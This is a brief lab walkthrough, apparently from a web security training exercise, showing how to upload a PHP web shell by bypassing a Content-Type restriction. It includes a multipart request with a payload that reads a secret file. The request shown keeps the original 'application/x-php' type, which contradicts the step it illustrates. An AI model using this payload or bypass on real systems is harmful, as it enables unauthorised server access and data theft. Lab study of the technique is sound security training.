# Web shell upload via Content-Type restriction bypass
Solution:
- File is uploaded at `/files/avatars/`
- We need to change the Content-Type of the php webshell from `application/x-php` to either `image/jpeg` or `image/png`
- The request would look like this:
```php
[SNIP]
-----------------------------312293322935403065182893868892

Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
[SNIP]
```
